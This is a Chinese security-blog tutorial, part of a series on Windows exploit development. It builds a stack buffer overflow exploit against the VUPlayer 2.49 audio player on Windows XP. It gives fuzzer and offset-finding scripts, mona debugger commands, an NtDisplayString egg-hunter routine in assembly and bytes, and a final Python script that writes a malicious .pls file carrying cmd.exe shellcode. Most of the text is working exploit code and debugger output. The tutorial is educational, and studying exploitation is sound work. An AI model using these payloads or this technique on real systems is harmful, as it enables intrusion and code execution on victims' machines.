*** 本文作者：zusheng，本文属FreeBuf原创奖励计划，未经许可禁止转载**

![](https://image.3001.net/images/20180419/15241189997525.jpg!small)

## 0x01 前言

漏洞-信息安全界最常见的词汇，在百度百科是这样描述的。

漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。

本文主要介绍的是Windows软件漏洞的利用开发教程。

我花了大量的时间来研究了计算机安全领域Windows漏洞利用开发，希望能和大家分享一下，能帮助到对这方面感兴趣的朋友，如有不足，还请见谅。

## 0x02 准备阶段

欢迎阅读本系列文章的第三部分，如果你错过了第二部分，请点击下方传送门。

<http://www.freebuf.com/articles/system/167959.html>

本部分我们将利用Egg hunter技术在堆栈中查找shellcode。

我们需要准备以下工具：

    
    
    1、Windows XP SP3 32-bit系统iso镜像
    2、Immunity Debugger-漏洞分析专用调试器
    3、代码文本编辑器（个人喜好，我用的是notepad++）
    4、VUPlayer 2.49
    

VUPlayer是一款Windows平台下免费的多格式音频播放器，我们的目标是VUPlayer版本2.49，你可以通过下面链接下载存在漏洞的程序。

    
    
    https://www.exploit-db.com/apps/39adeb7fa4711cd1cac8702fb163ded5-vuplayersetup.exe
    

软件下载安装

![](https://image.3001.net/images/20180419/15241190091085.png!small)

### Egg hunter

如果可用缓冲区太小不能将我们的shellcode存放，这时就需要Egg
hunter技术来帮助我们了，它可以让你使用少量自定义shellcode来查找实际的shellcode，换句话说，首先执行少量代码，然后尝试查找真正的shellcode并执行。

## 0x03 漏洞开发分析

首先，我们要了解如何才能使目标程序崩溃。

漏洞存在地址：

<https://www.exploit-db.com/exploits/7695/>

通过分析漏洞POC我们得知目标程序在打开pls文件发生了堆栈缓冲区溢出，现在我们来写一个fuzzer poc来帮助我们确认溢出。

    
    
    # -*- coding: UTF-8 -*-    low_size = 2000            #数据总大小
    juck = 'A' * low_size     #测试字符串
    plspayload = juck
    plsfp = open("payload.pls","w")    #生成测试Payload文档
    plsfp.write(plspayload);
    plsfp.close()
    

打开payload.pls，崩溃发生。

![](https://image.3001.net/images/20180419/15241190174682.png!small)

### 调试确认漏洞

现在用Immunity Debugger打开VUPlayer并点击Run（F9）

![](https://image.3001.net/images/20180419/15241190213517.png!small)

接下来打开测试payload.pls文件

![](https://image.3001.net/images/20180419/15241190261395.png!small)

确认EIP地址被覆盖，确认缓冲区被我们占领，非常有趣。

### 寻找EIP offset

确认完漏洞，接下来我们就要寻找EIP offset来控制EIP的值。

主要使用到mona插件，具体请看第一部分：

    
    
    !mona pc 2000
    !mona pattern_offset 0x68423768
    

![](https://image.3001.net/images/20180419/15241190387923.png!small)

很快我们就找到了偏移量1012.

测试一下EIP是否被准确覆盖。

    
    
    # -*- coding: UTF-8 -*-    import struct
    low_size = 2000            #数据总大小
    juck = '\x41' * 1012    #测试字符串
    eip = struct.pack("<L", 0x42434445)#覆盖EIP为0x42434445
    payload = juck + eip                     #组合payload
    end = "\x43"*(low_size - len(payload)) #填补剩余的空间确保溢出
    plspayload = payload +end        
    plsfp = open("payload.pls","w")#生成测试Payload文档
    plsfp.write(plspayload);
    plsfp.close()
    

EIP被准确覆盖

![](https://image.3001.net/images/20180419/15241190454254.png!small)

这证明我们能精准控制EIP地址，偏移量是正确的。

### 寻找合适的地址覆盖EIP

第一部分有介绍，这里我们就直接操作了，运行下列指令我们将得到一个jmp.txt

    
    
    !mona jmp -r esp
    

![](https://image.3001.net/images/20180419/15241190523448.png!small)

然后我们就得到一个地址0x7c8369f0，这个就是我们需要的EIP地址。

## 0x04 Egg hunter 介绍及构建

现在我们先更新一下python脚本，然后加入测试shellcode来看看堆栈情况。

    
    
    # -*- coding: UTF-8 -*-    import struct
    low_size = 2000            #数据总大小
    juck = '\x41' * 1012    #测试字符串
    eip = struct.pack("<L", 0x7c8369f0)#覆盖EIP为0x7c8369f0
    nops = "\x90" * 24
    shellcode = "\xCC" * 40                    #测试shellcode
    payload = juck + eip + nops    + shellcode #组合payload
    end = "\x43"*(low_size - len(payload))  #填补剩余的空间确保溢出
    plspayload = payload + end        
    plsfp = open("payload.pls","w")#生成测试Payload文档
    plsfp.write(plspayload);
    plsfp.close()
    

用Immunity Debugger打开VUPlayer并点击Run，然后打开脚本生成的测试payload.pls文件

![](https://image.3001.net/images/20180419/15241190586774.png!small)

这看起来并没有什么问题，我们可以用真实的shellcode来代替了。但这真心不是本文的重点，我们来给自己加点挑战，假如我们没有足够的空间来存放超过32字节的代码，而且也没其他寄存器选择，这时候该怎么办？这看来运气有点不好，但它确实很有意思。

解决的办法就是我们需要去构建一个非常小的汇编语言程序，这个程序能够搜索并执行我们的shellcode。那么它是怎么找到shellcode呢？所以我们shellcode要定义一个独特的标签，这样当它发现这个标签时，它会知道它找到了shellcode，然后再执行。

### Egg hunter 的构建

我们将使用基于NtDisplayString技术的egghunter代码，当然这个不是我凭空写出来的，代码本身是公布的，我只是改了标签。

    
    
    6681CAFF0F     or dx,0x0fff            ;通过添加循环遍历内存中的页面
    42             inc edx                    ;循环遍历每一个地址                
    52             push edx                ;入栈操作                
    6A43         push byte +0x43         ;NtDisplayString的系统调用ID            
    58             pop eax                 ;出栈操作，其实就是作参数
    CD2E         int 0x2e                 ;调用NtDisplayString            
    3C05        cmp al,0x5                 ;对比操作
    5A            pop edx                    ;出栈操作                
    74EF        jz 0x0                     ;如果ZF标志由CMP指令设置，则存在访问冲突
    ;无效页面，回到顶部
    B874303077    mov eax,0x7a757368        ;标签(7a 75 73 68 = zush) 
    8BFA        mov edi,edx                ;将EDI设置为EDX的当前地址指针以用于SCASD指令        
    AF            scasd                     ;将EAX中的值与DWORD值进行比较
    ;在SCASD比较后相应地设置EFLAGS寄存器,这里比较两次才算真正的发现shellcode
    75EA        jnz 0x5 
    AF            scasd                                                 
    75E7        jnz 0x5
    FFE7        jmp edi
    

它的工作原理就是循环遍历内存页面，发现每个地址的数据，然后将这个数据值与我们给它的唯一标签进行匹配，如果它发现数据与标签匹配，则它跳转到该地址并开始执行shellcode。

现在我们来更新一下python脚本

    
    
    # -*- coding: UTF-8 -*-    import struct
    low_size = 2000            #数据总大小
    juck = '\x41' * 1012    #测试字符串
    eip = struct.pack("<L", 0x7c8369f0)#覆盖EIP为0x7c8369f0
    nops = "\x90" * 24
    egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
    egghunter += "zush" #标志
    egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
    egg = "zushzush" # 标签 x 2
    shellcode = "\xCC"*300 # 用INT指令模拟shellcode
    payload = juck + eip + egghunter + egg + nops + shellcode #组合payload
    end = "\x43"*(low_size - len(payload)) #填补剩余的空间确保溢出
    plspayload = payload + end        
    plsfp = open("payload.pls","w")#生成测试Payload文档
    plsfp.write(plspayload);
    plsfp.close()
    

用Immunity Debugger打开VUPlayer并点击Run，然后打开脚本生成的测试payload.pls文件

![](https://image.3001.net/images/20180419/1524119075393.png!small)

你可以在堆栈看到我们的标志，也可以使用Mona命令

    
    
    !mona find -s "zushzush"
    

![](https://image.3001.net/images/20180419/15241190819043.png!small)

## 0x05 漏洞利用开发

现在整个开发就很简单了，我们来更新一下python脚本

    
    
    # -*- coding: UTF-8 -*-    import struct
    low_size = 2000            #数据总大小
    juck = '\x41' * 1012    #测试字符串
    eip = struct.pack("<L", 0x7c8369f0)#覆盖EIP为0x7c8369f0
    nops = "\x90" * 24
    egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
    egghunter += "zush" #标志
    egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
    egg = "zushzush" # 标签 x 2
    badcode = "\x42"*248        #证明即使shellcode空间不足，exploit仍然可以工作
    #cmd.exe shellcode
    shellcode = "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
    shellcode += "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
    shellcode += "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
    shellcode += "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
    shellcode += "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
    shellcode += "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
    shellcode += "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
    shellcode += "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
    shellcode += "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
    shellcode += "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
    shellcode += "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
    shellcode += "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
    shellcode += "\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE"
    shellcode += "\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53"
    shellcode += "\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24"
    shellcode += "\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51"
    shellcode += "\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE"
    shellcode += "\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45"
    shellcode += "\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54"
    shellcode += "\x24\x20\x57\xFF\xD0"
    payload = juck + eip + egghunter + badcode + egg + nops + shellcode #组合payload
    end = "\x43"*(low_size - len(payload)) #填补剩余的空间确保溢出
    plspayload = payload + end        
    plsfp = open("payload.pls","w")#生成测试Payload文档
    plsfp.write(plspayload);
    plsfp.close()
    

用Immunity Debugger打开VUPlayer并点击Run，然后打开脚本生成的测试payload.pls文件

![](https://image.3001.net/images/20180419/15241190889599.png!small)

exploit成功，cmd窗口打开了。

## 0x06 总结

本文我们主要了介绍了一种有趣的技术Egg hunter，了解了Egg hunter的应用场景以及如何利用Egg
hunter技术解决堆栈存放shellcode空间不足的问题。最后，还是那句话，本人水平有限，如有不足，还请各位兄弟指出。

 *** 本文作者：zusheng，本文属FreeBuf原创奖励计划，未经许可禁止转载**

